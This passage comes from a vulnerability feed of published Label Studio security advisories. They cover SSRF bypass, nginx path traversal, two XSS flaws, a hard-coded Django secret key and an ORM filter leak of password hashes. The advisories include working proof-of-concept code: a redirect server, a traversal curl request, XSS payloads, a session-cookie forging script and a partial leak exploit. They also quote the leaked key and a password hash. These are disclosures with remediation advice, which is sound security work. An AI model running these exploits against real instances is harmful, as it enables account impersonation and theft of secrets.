attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    